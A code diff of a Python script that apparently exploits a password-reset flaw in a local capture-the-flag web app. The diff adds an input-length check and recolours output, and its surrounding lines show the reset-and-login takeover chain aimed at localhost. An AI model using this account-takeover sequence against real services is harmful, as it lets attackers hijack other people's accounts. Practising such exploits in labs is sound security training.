@@ -53,6 +53,9 @@ print(f"{CYAN}--- this shows us the url to target for the post request to send o
 
 
 new_password = input("enter your new password here(must be 5 characters): ")
+if new_password.__len__() < 5:
+     print("must be 5 chars, try again")
+     sys.exit(1)
 newpass = requests.post(
     "http://localhost:4942/reset-password/confirm",
     data={"email": email, "token": token, "new_password": new_password},
@@ -64,7 +67,7 @@ print("status:", newpass.status_code)
 print("location:", newpass.headers.get("location"))
 print(newpass.text[:200])
 
-print(f"{CYAN}--- now that we changed the password, all thats left is to login ---{RESET}")
+print(f"{GREEN}--- now that we changed the password, all thats left is to login ---{RESET}")
 
 auth = requests.post(
     "http://localhost:4942/login",
@@ -79,7 +82,7 @@ if not cookies.get("session"):
     print(auth.text[:200])
     sys.exit(1)
  
-print("Logged in successfully with " + email + " and " + new_password)
+print(f"{GREEN}Logged in successfully with " + email + " and " + new_password)
 
 
 print(f"{CYAN}--- now for some reason, the actual flag for this vulnerability isn't that obvious to find, i found it in the backend(which we'll get into later), as well as in the api patch profile ---{RESET}")
